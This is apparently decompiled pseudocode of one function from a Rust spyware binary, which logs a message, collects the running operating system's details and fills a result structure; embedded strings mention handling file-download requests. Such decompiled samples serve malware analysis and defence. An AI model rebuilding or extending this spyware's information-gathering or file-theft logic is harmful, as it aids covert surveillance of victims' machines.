long long spyware::actions::basic_info::get_basic_info_request(struct_0 *a0)
{
    unsigned long long v0;  // [bp-0x60]
    unsigned long long v1;  // [bp-0x58]
    unsigned long long v2;  // [bp-0x50]
    unsigned long long v3;  // [bp-0x48]
    unsigned long long v4;  // [bp-0x40]
    unsigned long long v5;  // [bp-0x38]
    unsigned long long v6;  // [bp-0x30]
    unsigned long long v7;  // [bp-0x28]
    uint128_t v8;  // [bp-0x20]

    if (::0x454a00::core::sync::atomic::atomic_load() >= 4)
    {
        v5 = &g_4b97e8;
        v6 = 1;
        v7 = 8;
        v8 = 0;
        v0 = "spyware::actions::basic_infoHandling download file request: path \"\"Could not read file \"\", error \"";
        v1 = 28;
        v2 = "spyware::actions::basic_infoHandling download file request: path \"\"Could not read file \"\", error \"";
        v3 = 28;
        v4 = log::__private_api::loc(&g_4b97f8);
        log::__private_api::log(&v5, 4, &v0);
    }
    spyware::actions::basic_info::get_running_os_info(a0);
    a0->field_38 = 1;
    a0->field_3e = 1;
    a0->field_3c = 257;
    a0->field_18 = 0x8000000000000000;
    return a0;
}
